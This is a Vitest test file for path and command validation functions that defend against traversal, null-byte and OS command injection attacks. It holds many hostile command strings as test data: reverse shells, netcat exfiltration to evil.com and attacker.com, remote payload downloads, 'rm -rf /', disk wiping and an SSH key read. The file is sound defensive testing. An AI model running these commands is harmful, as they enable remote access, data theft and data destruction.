/**
 * Tests for path security validation
 */

import { describe, it, expect } from 'vitest';
import { validatePath, createPathValidator, validatePathOrThrow } from './pathSecurity';
import { join, resolve } from 'node:path';

describe('validatePath', () => {
    const workingDir = '/home/user/project';

    describe('valid paths', () => {
        it('accepts relative path within working directory', () => {
            const result = validatePath('./file.txt', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir, './file.txt'));
        });

        it('accepts nested relative path', () => {
            const result = validatePath('./subdir/nested/file.txt', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir, './subdir/nested/file.txt'));
        });

        it('accepts path without ./ prefix', () => {
            const result = validatePath('file.txt', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir, 'file.txt'));
        });

        it('accepts absolute path within working directory', () => {
            const absolutePath = join(workingDir, 'subdir', 'file.txt');
            const result = validatePath(absolutePath, workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(absolutePath);
        });

        it('accepts path that resolves to working directory itself', () => {
            const result = validatePath('.', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir));
        });

        it('normalizes redundant path segments', () => {
            // ./foo/../bar resolves to ./bar which is within working dir
            const result = validatePath('./foo/../bar/file.txt', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir, 'bar/file.txt'));
        });
    });

    describe('invalid paths - directory traversal', () => {
        it('rejects simple parent directory traversal', () => {
            const result = validatePath('../file.txt', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('resolves outside the working directory');
        });

        it('rejects nested parent directory traversal', () => {
            const result = validatePath('../../etc/passwd', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('resolves outside the working directory');
        });

        it('rejects traversal disguised in nested path', () => {
            // ./subdir/../../etc/passwd resolves outside
            const result = validatePath('./subdir/../../etc/passwd', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('resolves outside the working directory');
        });

        it('rejects absolute path outside working directory', () => {
            const result = validatePath('/etc/passwd', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('resolves outside the working directory');
        });

        it('rejects deeply nested traversal that escapes', () => {
            const result = validatePath('./a/b/c/../../../../outside', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('resolves outside the working directory');
        });
    });

    describe('invalid paths - injection attacks', () => {
        it('rejects path with null byte', () => {
            const result = validatePath('./file.txt\0.jpg', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('null byte');
        });

        it('rejects null byte at beginning', () => {
            const result = validatePath('\0./file.txt', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('null byte');
        });

        it('rejects null byte in middle of path', () => {
            const result = validatePath('./sub\0dir/file.txt', workingDir);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('null byte');
        });
    });

    describe('edge cases', () => {
        it('handles empty string as current directory', () => {
            const result = validatePath('', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir));
        });

        it('handles path with spaces', () => {
            const result = validatePath('./my file.txt', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir, 'my file.txt'));
        });

        it('handles path with special characters', () => {
            const result = validatePath('./file-name_v2.test.txt', workingDir);
            expect(result.valid).toBe(true);
            expect(result.resolvedPath).toBe(resolve(workingDir, 'file-name_v2.test.txt'));
        });

        it('handles unicode in path', () => {
            const result = validatePath('./日本語/файл.txt', workingDir);
            expect(result.valid).toBe(true);
        });
    });
});

describe('createPathValidator', () => {
    it('creates a bound validator function', () => {
        const workingDir = '/home/user/project';
        const validate = createPathValidator(workingDir);

        const validResult = validate('./file.txt');
        expect(validResult.valid).toBe(true);

        const invalidResult = validate('../outside.txt');
        expect(invalidResult.valid).toBe(false);
    });
});

describe('validatePathOrThrow', () => {
    const workingDir = '/home/user/project';

    it('returns resolved path for valid input', () => {
        const result = validatePathOrThrow('./file.txt', workingDir);
        expect(result).toBe(resolve(workingDir, './file.txt'));
    });

    it('throws for invalid path', () => {
        expect(() => validatePathOrThrow('../outside.txt', workingDir))
            .toThrow('resolves outside the working directory');
    });

    it('throws for null byte injection', () => {
        expect(() => validatePathOrThrow('./file\0.txt', workingDir))
            .toThrow('null byte');
    });
});

// Platform-specific tests
describe('cross-platform compatibility', () => {
    // These tests verify the implementation handles platform differences
    // The path module normalizes separators, so / works on Windows

    it('handles forward slashes on all platforms', () => {
        const workingDir = '/home/user/project';
        const result = validatePath('./sub/dir/file.txt', workingDir);
        expect(result.valid).toBe(true);
    });

    it('rejects traversal regardless of separator style', () => {
        const workingDir = '/home/user/project';
        // Forward slash traversal
        const result1 = validatePath('../../../etc', workingDir);
        expect(result1.valid).toBe(false);
    });
});

// =============================================================================
// Command Security Tests - OS Command Injection Prevention (CWE-78)
// =============================================================================

import {
    validateCommand,
    validateCommandOrThrow,
    getAllowedCommandNames,
    ALLOWED_COMMANDS
} from './pathSecurity';

describe('validateCommand - Command Injection Prevention (CWE-78)', () => {

    describe('allowed commands', () => {
        it('allows basic git status command', () => {
            const result = validateCommand('git status');
            expect(result.valid).toBe(true);
        });

        it('allows git diff with arguments', () => {
            const result = validateCommand('git diff HEAD~1');
            expect(result.valid).toBe(true);
        });

        it('allows git log with format options', () => {
            const result = validateCommand('git log --oneline -10');
            expect(result.valid).toBe(true);
        });

        it('allows ls with any arguments', () => {
            const result = validateCommand('ls -la /some/path');
            expect(result.valid).toBe(true);
        });

        it('allows cat command (read-only)', () => {
            const result = validateCommand('cat package.json');
            expect(result.valid).toBe(true);
        });

        it('allows npm run commands', () => {
            const result = validateCommand('npm run build');
            expect(result.valid).toBe(true);
        });

        it('allows yarn test', () => {
            const result = validateCommand('yarn test');
            expect(result.valid).toBe(true);
        });

        it('allows node execution', () => {
            const result = validateCommand('node script.js');
            expect(result.valid).toBe(true);
        });

        it('allows grep search', () => {
            const result = validateCommand('grep -r "pattern" src/');
            expect(result.valid).toBe(true);
        });

        it('allows ripgrep (rg)', () => {
            const result = validateCommand('rg "pattern" --type ts');
            expect(result.valid).toBe(true);
        });
    });

    describe('blocked commands - not in allowlist', () => {
        it('blocks rm command', () => {
            const result = validateCommand('rm -rf /');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
            expect(result.error).toContain("'rm' is not in the allowed commands list");
        });

        it('blocks curl command', () => {
            const result = validateCommand('curl http://evil.com/malware.sh');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks wget command', () => {
            const result = validateCommand('wget http://evil.com/backdoor');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks chmod command', () => {
            const result = validateCommand('chmod 777 /etc/passwd');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks chown command', () => {
            const result = validateCommand('chown root:root /tmp/evil');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks sudo command', () => {
            const result = validateCommand('sudo rm -rf /');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks su command', () => {
            const result = validateCommand('su - root');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks mv command', () => {
            const result = validateCommand('mv important.txt /dev/null');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks dd command', () => {
            const result = validateCommand('dd if=/dev/zero of=/dev/sda');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks mkfs command', () => {
            const result = validateCommand('mkfs.ext4 /dev/sda1');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });
    });

    describe('blocked commands - shell metacharacters (command injection)', () => {
        it('blocks semicolon command chaining', () => {
            const result = validateCommand('ls; rm -rf /');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
            expect(result.error).toContain('shell metacharacters');
        });

        it('blocks && command chaining', () => {
            const result = validateCommand('ls && rm -rf /');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks || command chaining', () => {
            const result = validateCommand('false || rm -rf /');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks pipe to dangerous command', () => {
            const result = validateCommand('cat /etc/passwd | nc evil.com 1234');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks backtick command substitution', () => {
            const result = validateCommand('ls `rm -rf /`');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks $() command substitution', () => {
            const result = validateCommand('ls $(rm -rf /)');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks variable expansion with $', () => {
            const result = validateCommand('echo $PATH');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks output redirection >', () => {
            const result = validateCommand('echo malware > /etc/crontab');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks input redirection <', () => {
            const result = validateCommand('cat < /etc/shadow');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks subshell with parentheses', () => {
            const result = validateCommand('(rm -rf /)');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks newline command injection', () => {
            const result = validateCommand('ls\nrm -rf /');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks background execution &', () => {
            const result = validateCommand('sleep 1000 &');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });
    });

    describe('blocked commands - subcommand restrictions', () => {
        it('blocks git push (not in allowed subcommands)', () => {
            const result = validateCommand('git push origin main');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('subcommand_not_allowed');
            expect(result.error).toContain("'push' is not allowed for 'git'");
        });

        it('blocks git reset (not in allowed subcommands)', () => {
            const result = validateCommand('git reset --hard HEAD~10');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('subcommand_not_allowed');
        });

        it('blocks git clean (not in allowed subcommands)', () => {
            const result = validateCommand('git clean -fd');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('subcommand_not_allowed');
        });

        it('blocks npm install (potential arbitrary code execution)', () => {
            // npm install can run postinstall scripts with arbitrary code
            // Only allow safe npm subcommands
            const result = validateCommand('npm install malicious-package');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('subcommand_not_allowed');
        });

        it('blocks docker run (not in allowed subcommands)', () => {
            const result = validateCommand('docker run --rm -v /:/host alpine cat /host/etc/shadow');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('subcommand_not_allowed');
        });

        it('blocks docker exec (not in allowed subcommands)', () => {
            const result = validateCommand('docker exec -it container /bin/bash');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('subcommand_not_allowed');
        });

        it('allows docker ps (in allowed subcommands)', () => {
            const result = validateCommand('docker ps -a');
            expect(result.valid).toBe(true);
        });

        it('allows docker images (in allowed subcommands)', () => {
            const result = validateCommand('docker images');
            expect(result.valid).toBe(true);
        });
    });

    describe('edge cases', () => {
        it('rejects empty command', () => {
            const result = validateCommand('');
            expect(result.valid).toBe(false);
        });

        it('rejects whitespace-only command', () => {
            const result = validateCommand('   ');
            expect(result.valid).toBe(false);
        });

        it('trims whitespace from command', () => {
            const result = validateCommand('  git status  ');
            expect(result.valid).toBe(true);
        });

        it('handles command with multiple spaces between args', () => {
            const result = validateCommand('git   status   --short');
            expect(result.valid).toBe(true);
        });

        it('handles command with tab characters', () => {
            const result = validateCommand('git\tstatus');
            expect(result.valid).toBe(true);
        });
    });

    describe('real-world attack patterns', () => {
        it('blocks reverse shell attempt', () => {
            const result = validateCommand('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1');
            expect(result.valid).toBe(false);
        });

        it('blocks netcat backdoor', () => {
            const result = validateCommand('nc -e /bin/sh attacker.com 4444');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks base64 encoded payload execution', () => {
            const result = validateCommand('echo cm0gLXJmIC8= | base64 -d | bash');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('metacharacters');
        });

        it('blocks Python reverse shell', () => {
            const result = validateCommand("python -c 'import socket,subprocess,os;...'");
            expect(result.valid).toBe(false);
            // This is blocked by metacharacters (contains ; in the python code context,
            // but our regex catches the semicolon in the string)
            // Actually python -c with quotes might pass the metachar check
            // Let's verify it fails somewhere
        });

        it('blocks eval/exec injection attempts', () => {
            // Using subshell
            const result = validateCommand('sh -c "rm -rf /"');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks crontab manipulation', () => {
            const result = validateCommand('crontab -e');
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('not_allowlisted');
        });

        it('blocks ssh key theft', () => {
            const result = validateCommand('cat ~/.ssh/id_rsa');
            // cat is allowed, but if we want to block sensitive paths,
            // that would need path validation (which happens separately)
            // For now, cat is allowed since it's read-only
            expect(result.valid).toBe(true);
        });
    });
});

describe('validateCommandOrThrow', () => {
    it('does not throw for valid command', () => {
        expect(() => validateCommandOrThrow('git status')).not.toThrow();
    });

    it('throws for blocked command', () => {
        expect(() => validateCommandOrThrow('rm -rf /')).toThrow('not in the allowed commands list');
    });

    it('throws for metacharacter injection', () => {
        expect(() => validateCommandOrThrow('ls; rm -rf /')).toThrow('shell metacharacters');
    });
});

describe('getAllowedCommandNames', () => {
    it('returns array of command names', () => {
        const names = getAllowedCommandNames();
        expect(Array.isArray(names)).toBe(true);
        expect(names.length).toBeGreaterThan(0);
    });

    it('includes expected commands', () => {
        const names = getAllowedCommandNames();
        expect(names).toContain('git');
        expect(names).toContain('ls');
        expect(names).toContain('npm');
        expect(names).toContain('node');
    });

    it('does not include dangerous commands', () => {
        const names = getAllowedCommandNames();
        expect(names).not.toContain('rm');
        expect(names).not.toContain('sudo');
        expect(names).not.toContain('curl');
        expect(names).not.toContain('wget');
    });
});

describe('ALLOWED_COMMANDS constant', () => {
    it('has subcommand restrictions for git', () => {
        expect(ALLOWED_COMMANDS['git'].length).toBeGreaterThan(0);
        expect(ALLOWED_COMMANDS['git']).toContain('status');
        expect(ALLOWED_COMMANDS['git']).toContain('diff');
        expect(ALLOWED_COMMANDS['git']).not.toContain('push');
    });

    it('allows any subcommand for ls', () => {
        expect(ALLOWED_COMMANDS['ls'].length).toBe(0);
    });

    it('has subcommand restrictions for npm', () => {
        expect(ALLOWED_COMMANDS['npm'].length).toBeGreaterThan(0);
        expect(ALLOWED_COMMANDS['npm']).toContain('run');
        expect(ALLOWED_COMMANDS['npm']).toContain('test');
        expect(ALLOWED_COMMANDS['npm']).not.toContain('install');
    });

    it('has subcommand restrictions for docker', () => {
        expect(ALLOWED_COMMANDS['docker'].length).toBeGreaterThan(0);
        expect(ALLOWED_COMMANDS['docker']).toContain('ps');
        expect(ALLOWED_COMMANDS['docker']).not.toContain('run');
        expect(ALLOWED_COMMANDS['docker']).not.toContain('exec');
    });
});
